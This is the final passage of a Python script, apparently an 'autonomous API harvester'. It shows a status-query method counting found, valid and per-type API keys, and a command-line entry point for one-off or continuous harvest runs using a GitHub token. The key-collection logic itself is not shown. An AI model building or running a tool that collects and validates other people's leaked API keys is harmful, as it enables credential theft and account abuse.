            }
        }
    
    def query(self, question: str = None) -> Dict:
        """Answer queries about component state"""
        if question == 'health':
            return {'healthy': True, 'version': self.version, 'ready': True}
        elif question == 'sources':
            return {'sources': len(self.source_discovery.sources)}
        elif question == 'keys':
            return {
                'total_found': self.stats['total_keys_found'],
                'valid': self.stats['valid_keys'],
                'by_type': self.stats['keys_by_type']
            }
        else:
            return self.get_status()


# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    print("\n" + "="*60)
    print("🌾 REAL AUTONOMOUS API HARVESTER")
    print("="*60)
    
    import argparse
    parser = argparse.ArgumentParser(description='Real Autonomous Harvester')
    parser.add_argument('--run', action='store_true', help='Run one harvest cycle')
    parser.add_argument('--continuous', action='store_true', help='Run continuously')
    parser.add_argument('--interval', type=int, default=300, help='Interval in seconds')
    parser.add_argument('--status', action='store_true', help='Show status')
    parser.add_argument('--github-token', help='GitHub API token')
    
    args = parser.parse_args()
    
    harvester = RealAutonomousHarvester()
    
    if args.github_token:
        harvester.set_github_token(args.github_token)
    
    if args.run:
        result = harvester.run(continuous=False)
        print(json.dumps(result, indent=2))
    elif args.continuous:
        harvester.run(continuous=True, interval=args.interval)
    elif args.status:
        print(json.dumps(harvester.get_status(), indent=2))
    else:
        print(json.dumps(harvester.generate(), indent=2))
        print("\n💡 Use --run, --continuous, or --status for more options")
